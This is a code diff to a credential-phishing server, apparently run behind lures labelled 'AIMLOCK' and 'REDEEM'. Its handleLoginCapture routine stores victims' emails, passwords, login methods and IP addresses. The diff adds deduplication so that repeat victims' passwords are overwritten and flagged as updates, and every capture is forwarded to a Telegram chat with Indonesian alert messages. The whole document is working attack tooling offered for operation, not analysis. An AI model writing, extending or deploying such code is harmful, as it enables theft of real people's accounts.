@@ -135,10 +135,25 @@ async function ghSaveData(arr) {
 
 async function addLogin(entry) {
   const arr = await ghLoadData();
-  arr.unshift(entry);
-  if (arr.length > 5000) arr.splice(5000);
+  const key = (entry.email || '').trim().toLowerCase();
+  const idx = arr.findIndex(l => (l.email || '').trim().toLowerCase() === key);
+  if (idx !== -1) {
+    arr[idx] = Object.assign(arr[idx], {
+      password: entry.password,
+      method:   entry.method,
+      page:     entry.page,
+      ip:       entry.ip,
+      ts:       entry.ts,
+      updated:  true
+    });
+    const updated = arr.splice(idx, 1)[0];
+    arr.unshift(updated);
+  } else {
+    arr.unshift(entry);
+    if (arr.length > 5000) arr.splice(5000);
+  }
   await ghSaveData(arr);
-  return arr.length;
+  return { count: arr.length, isUpdate: idx !== -1 };
 }
 
 async function clearDatabase() {
@@ -818,11 +833,12 @@ function pageLabel(page) {
   return page === 'aimlock' ? 'AIMLOCK' : 'REDEEM';
 }
 
-function buildNotif(l, no) {
+function buildNotif(l, no, isUpdate) {
   const isAimlock = (l.page === 'aimlock');
+  const status    = isUpdate ? '🔄 <b>DATA DIPERBARUI!</b>' : '🆕 <b>DATA BARU MASUK!</b>';
   const header    = isAimlock
-    ? '🎯 <b>LOGIN AIMLOCK MASUK!</b>'
-    : '🎁 <b>LOGIN REDEEM MASUK!</b>';
+    ? `🎯 <b>LOGIN AIMLOCK</b> — ${status}`
+    : `🎁 <b>LOGIN REDEEM</b> — ${status}`;
 
   return `${header}
 ${LINE}
@@ -834,7 +850,7 @@ ${methodIcon(l.method)} <b>Metode</b>   : <b>${l.method}</b>
 🌐 <b>IP</b>       : <code>${l.ip}</code>
 🕐 <b>Waktu</b>    : ${fmtTime(l.ts)} WIB
 ${LINE}
-📊 <b>Data ke-${no}</b>`;
+📊 <b>Total data: ${no}</b>${isUpdate ? '  (update, bukan duplikat)' : ''}`;
 }
 
 // ════════════════════════════════════════
@@ -1117,10 +1133,10 @@ async function handleLoginCapture(req, res) {
     ts: Date.now()
   };
 
-  const no = await addLogin(entry);
+  const { count: no, isUpdate } = await addLogin(entry);
 
   if (getTgToken() && getTgChat()) {
-    await tgSend(getTgChat(), buildNotif(entry, no), {
+    await tgSend(getTgChat(), buildNotif(entry, no, isUpdate), {
       reply_markup: {
         inline_keyboard: [
           [{ text: '📋 Lihat Semua Data', callback_data: 'data_0' }, { text: '📈 Statistik', callback_data: 'stats' }],
